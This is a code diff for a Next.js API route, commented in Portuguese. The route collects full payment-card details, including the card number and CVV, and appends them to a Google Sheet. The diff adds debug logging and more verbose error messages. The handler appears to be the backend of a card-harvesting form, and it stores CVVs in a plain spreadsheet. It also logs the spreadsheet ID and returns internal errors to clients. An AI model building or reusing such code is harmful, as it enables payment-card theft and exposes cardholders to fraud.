@@ -10,9 +10,29 @@ interface FormData {
 }
 
 export async function POST(request: NextRequest) {
+  console.log('API route called');
   try {
+    // Log environment variables (without sensitive data)
+    console.log('Environment check:', {
+      hasGoogleCreds: !!process.env.GOOGLE_APPLICATION_CREDENTIALS,
+      hasSpreadsheetId: !!process.env.GOOGLE_SPREADSHEET_ID,
+      spreadsheetIdValue: process.env.GOOGLE_SPREADSHEET_ID, // Log the actual value for debugging
+    });
+
     const data: FormData = await request.json()
-    console.log('Dados do formulário recebidos:', data);
+    console.log('Dados do formulário recebidos:', {
+      ...data,
+      cardNumber: '****', // Hide sensitive data in logs
+      cardCVV: '***'
+    });
+
+    // Validate required environment variables
+    if (!process.env.GOOGLE_APPLICATION_CREDENTIALS) {
+      throw new Error('Credenciais do Google não configuradas');
+    }
+    if (!process.env.GOOGLE_SPREADSHEET_ID) {
+      throw new Error('ID da planilha não configurado');
+    }
 
     const formattedData = [
       data.cardName,            // Nome no Cartão
@@ -22,12 +42,23 @@ export async function POST(request: NextRequest) {
       data.cardCVV,             // CVV
     ];
 
-    console.log('Dados formatados para salvar:', formattedData);
+    console.log('Tentando salvar dados na planilha...');
     await appendToSheet(formattedData);
-    return NextResponse.json({ success: true, message: 'Dados salvos com sucesso' })
+    console.log('Dados salvos com sucesso na planilha');
+    
+    return NextResponse.json({ 
+      success: true, 
+      message: 'Dados salvos com sucesso'
+    })
   } catch (error) {
-    console.error('Erro ao processar submissão do formulário:', error);
-    return NextResponse.json({ success: false, error: 'Falha ao salvar dados' }, { status: 500 })
+    console.error('Erro detalhado ao processar submissão:', error);
+    const errorMessage = error instanceof Error ? error.message : 'Erro desconhecido';
+    return NextResponse.json({ 
+      success: false, 
+      error: `Falha ao salvar dados: ${errorMessage}` 
+    }, { 
+      status: 500 
+    })
   }
 }
 
